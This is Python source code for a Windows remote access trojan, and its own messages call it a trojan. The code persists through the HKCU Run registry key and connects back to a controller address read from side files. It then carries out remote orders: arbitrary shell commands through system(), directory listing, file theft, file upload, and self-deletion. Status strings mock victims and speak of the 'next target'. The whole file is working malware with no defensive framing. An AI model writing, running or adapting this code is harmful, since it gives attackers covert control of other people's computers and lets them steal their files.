from socket import socket, AF_INET, SOCK_STREAM
from os import listdir, system, walk
from os.path import exists
from time import sleep
from winreg import OpenKey, HKEY_CURRENT_USER, SetValue, REG_SZ
from sys import argv
def ziqidong():
    caller_file = argv[0]
    caller_file = caller_file.replace('/', '\\')
    #caller_file = caller_file.replace('py', 'exe')
    key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion")
    SetValue(key, "Run", REG_SZ, caller_file)
ziqidong()
def jieshou():
    name = s.recv(1024).decode('utf-8')
    while 1:
        cc = s.recv(1048576)
        if cc[-19:-18] == b'2':
            print("%s" % name, '接收完成')
            with open(r'%s' % name, 'ab') as f:
                f.write(cc[:-19])
            break
        else:
            print('jishu')
            with open(r'%s' %name, 'ab') as f:
                f.write(cc)
def m_or_w(x):
    x = x[-4:]
    if '.'in x:
        return 1
    else:
        return 0
def copyy(x):
    name = 'wei_zhi_cuo_wu'
    for i in range(len(x)):
        if x[len(x)-1-i] == '\\' or x[len(x)-1-i] == '/':
            name = x[len(x)-i:]
            break
    s.send(name.encode('utf-8'))
    with open(x, 'rb') as f:
        ff = f.read()
        try:
            s.send(ff)
        except:
            s.send('文件发送出现问题'.encode('utf-8'))
def chazhao(lujin):
    im = ''
    names = listdir(lujin)
    for i in names:
        im = im + i + '!'
    s.send(im.encode('utf-8'))

def wz1():
    caller_file = argv[0]
    caller_file = caller_file.replace('/', '\\')
    caller_file = caller_file.replace('win_64.exe', 'win_64_1.txt')
    f = open(caller_file, 'r')
    c = f.read()
    return c
def wz2():
    caller_file = argv[0]
    caller_file = caller_file.replace('/', '\\')
    caller_file = caller_file.replace('win_64.exe', 'win_64_2.txt')
    f = open(caller_file, 'r')
    c = f.read()
    c = int(c)
    return c
pl = 30
while 1:
    try:
        s = socket(AF_INET, SOCK_STREAM)
        while 1:
            try:
                #s.connect((wz1(), 8000))
                s.connect((wz1(), wz2()))
                print('-------------')
                break
            except:
                print('**************')
                sleep(pl)
        t = 0
        while 1:
            lei = s.recv(10).decode('utf-8')
            print(lei)
            if lei == '0':
                minlin = s.recv(1024).decode('utf-8')
                s.send('0木马任务完成'.encode('utf-8'))
                system(minlin)                            #执行
            elif lei == '1':
                lujin = s.recv(1024).decode('utf-8')
                #查找文件，并发送
                try:
                    chazhao(lujin)
                    s.send('1木马任务完成'.encode('utf-8'))
                except:
                    s.send('1路径可能有问题'.encode('utf-8'))
                    s.send('1木马任务完成-'.encode('utf-8'))

            elif lei == '2':
                lujin = s.recv(1024).decode('utf-8')
                if exists(lujin) == False:
                    print(str(walk(lujin)))
                    s.send('2木马路径可能有问题'.encode('utf-8'))
                    s.send('2木马任务完成-'.encode('utf-8'))
                    continue
                if m_or_w(lujin):
                    copyy(lujin)
                    s.send('2木马任务完成'.encode('utf-8'))
                else:
                    pass
            elif lei == '3':
                jieshou()
                s.send('3木马任务完成'.encode('utf-8'))
            elif lei == '-1':
                s.send('木马:已退出本次连接'.encode('utf-8'))
                pl = int(s.recv(1024).decode('utf-8'))
                c = '木马已回归待连状态，%ds连接一次'%pl
                c = c.encode('utf-8')
                s.send(c)
                break
            elif lei == '-1-1':
                t = 1
                break
            elif lei == '4':
                c = s.recv(100).decode('utf-8')
                if c == '0':
                    caller_filez = argv[0]
                    caller_filez = caller_filez.replace('/', '\\')
                    caller_file = caller_filez.replace('win_64.exe', 'win_64_1.txt')
                    minglin = r'del /a/f/q {}'.format(caller_file)
                    system(minglin)
                    caller_file = caller_filez.replace('win_64.exe', 'win_64_2.txt')
                    minglin = r'del /a/f/q {}'.format(caller_file)
                    system(minglin)
                    kong = ''
                    key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion")
                    SetValue(key, "Run", REG_SZ, kong)
                    cc = '它自毁了，请节哀，并准备下一个目标吧|斜眼笑|'
                    s.send(cc.encode('utf-8'))
                    continue
                ziqidong()
                caller_file = argv[0]
                caller_file = caller_file.replace('/', '\\')
                caller_file = caller_file.replace('py', 'exe')
                c = '木马:已再次写入注册表'+'\n具体目录为：'+caller_file
                s.send(c.encode('utf-8'))
            else:
                print('收到垃圾信息')
                sleep(30)
                break
        if t == 1:
            s.send('木马已被kill，他（她）暂时安全了'.encode('utf-8'))
            break

    except:
        print('错误导致重置')
        sleep(30)
        pass
